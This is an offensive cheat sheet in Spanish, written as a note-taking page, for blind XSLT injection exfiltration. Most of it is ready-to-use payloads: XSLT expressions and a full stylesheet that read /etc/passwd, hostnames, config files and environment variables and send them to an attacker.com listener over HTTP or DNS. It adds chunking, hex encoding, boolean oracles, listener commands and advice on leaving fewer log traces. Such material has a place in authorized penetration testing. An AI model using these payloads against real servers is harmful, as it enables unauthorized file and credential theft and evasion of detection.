---
aliases:
  - XSLT Blind Injection
  - XSLT OOB
  - XSLT Out-of-Band Exfil
tags:
  - type/technique
  - vuln/xslt-injection
  - technique/exfiltration
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection]]"
---
# XSLT - Blind Exfil

***

## Exfiltración vía HTTP (URLs)

| **Objetivo** | **Payload** | **Canal** |
|:---:|:---:|:---:|
| Listener simple | `python3 -m http.server 8080` (atacante) | Logs en consola. |
| Listener raw TCP | `nc -lvnp 8080` | Headers + body crudos. |
| Burp Collaborator | `interactsh-client -v` | Domain único + dashboard. |
| Exfil 2.0+ básico | `<xsl:copy-of select="document(concat('http://attacker:8080/?d=', encode-for-uri(unparsed-text('file:///etc/passwd'))))"/>` | URL del listener con data encoded. |
| Exfil 1.0 (XML válido) | `<xsl:copy-of select="document(concat('http://attacker:8080/?d=', document('file:///var/www/config.xml')))"/>` | Sin `unparsed-text()` — usar archivo XML. |
| Exfil con `unparsed-text` | `<xsl:value-of select="unparsed-text(concat('http://attacker:8080/?f=', encode-for-uri($secret)))"/>` | XSLT 2.0+ alternativa. |
| Chunked URL | `<xsl:for-each select="1 to ceiling(string-length($s) div 200)"><xsl:variable name="c" select="substring($s,(.-1)*200+1,200)"/><xsl:copy-of select="document(concat('http://attacker/?n=',.,'&amp;d=',encode-for-uri($c)))"/></xsl:for-each>` | Para data > 2000 bytes. |
| Error-based fallback | `<xsl:value-of select="document('file:///etc/passwd')/nonexistent"/>` | Si la app refleja errores en la response. |
| Boolean oracle | `<xsl:if test="contains(unparsed-text('file:///etc/passwd'),'root:x:0')"><xsl:copy-of select="document('http://hit.attacker/')"/></xsl:if>` | Combinar boolean check + OOB callback. |
| POST via XForms (raro) | `<xsl:copy-of select="document(concat('http://attacker/log?d=',$s))"/>` | document() solo soporta GET — POST no nativo. |
^xslt-oob-http

### Stylesheet completo OOB HTTP

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="2.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:variable name="secret" select="unparsed-text('file:///etc/passwd')"/>
    <xsl:copy-of select="document(concat('http://attacker.com:8080/?d=', encode-for-uri($secret)))"/>
  </xsl:template>
</xsl:stylesheet>
```

___

## Exfiltración vía DNS

| **Objetivo** | **Payload** | **Canal** |
|:---:|:---:|:---:|
| Setup nameserver | `sudo tcpdump -ni eth0 -s 0 -A 'udp port 53'` | Captura queries DNS. |
| Burp Collaborator DNS | Subdomain `<id>.oast.fun` automático | Dashboard de queries. |
| interactsh DNS | `interactsh-client -v -dns-only` | Solo DNS. |
| Hostname exfil | `<xsl:value-of select="document(concat('http://', unparsed-text('file:///etc/hostname'), '.attacker.com/'))"/>` | Hostname en subdomain. |
| User exfil | `<xsl:value-of select="document(concat('http://', environment-variable('USER'), '.attacker.com/'))"/>` | Env var (XSLT 3.0). |
| Boolean DNS | `<xsl:if test="contains(unparsed-text('file:///etc/passwd'),'root:x:0')"><xsl:value-of select="document('http://hit.attacker.com/')"/></xsl:if>` | DNS query solo si match — oracle remoto. |
| Hex encoded chunk | `<xsl:variable name="hex"><xsl:for-each select="string-to-codepoints($chunk)"><xsl:value-of select="format-integer(., '00')"/></xsl:for-each></xsl:variable><xsl:value-of select="document(concat('http://',$hex,'.attacker.com/'))"/>` | Hex chunks de ≤63 chars (limit DNS label). |
| Chunked DNS | `<xsl:for-each select="1 to 10"><xsl:variable name="c" select="substring($s,(.-1)*30+1,30)"/><xsl:value-of select="document(concat('http://chunk',.,'-',$c,'.attacker.com/'))"/></xsl:for-each>` | Multiples queries DNS con chunks. |
| Wildcard zone | Setup `*.attacker.com` apuntando a NS controlado | Captura cualquier subdomain. |
^xslt-oob-dns

### Limitaciones DNS

| Constraint | Valor | Workaround |
|---|---|---|
| Subdomain max | 63 chars | Chunking |
| FQDN total | ≤ 253 chars | Chunking |
| Charset | `[a-z0-9-]` | Hex / base32 encode |
| Case | Insensitive | base32 OK, base64 NO |

### Cuándo elegir DNS vs HTTP

- HTTP filtrado / proxied → DNS suele pasar.
- App internal sin egress HTTP → DNS internal a veces resuelve externos.
- Logs deja menos huella DNS que HTTP en muchas orgs.
- HTTP permite payloads grandes sin chunking.

***
